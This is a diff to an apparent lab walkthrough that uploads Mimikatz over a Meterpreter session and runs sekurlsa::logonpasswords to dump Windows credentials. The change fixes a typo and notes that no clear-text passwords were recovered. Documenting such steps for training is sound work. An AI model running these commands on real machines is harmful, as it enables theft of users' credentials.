@@ -6,7 +6,7 @@ Mimikatz is a free and open source program for Microsoft Windows that can be use
 ## Credential dumping with Mimikatz
 ### After obtained an meterpreter sessions, we have to upload in the target machine the file mimikatz.exe
  - cd C:\\
- - mdkir Temp
+ - mkdir Temp
  - cd Temp
  - upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe <br>
 <img src="upload.png" width=70% height="auto"><br><br>
@@ -27,6 +27,8 @@ Mimikatz is a free and open source program for Microsoft Windows that can be use
  - sekurlsa::logonpasswords <br>
 <img src="logon.png" width=70% height="auto"><br><br>
 
+
+ Unfortunately, there is no logon password in clear text, because they disabled it, so it is well configured.
 
 
 
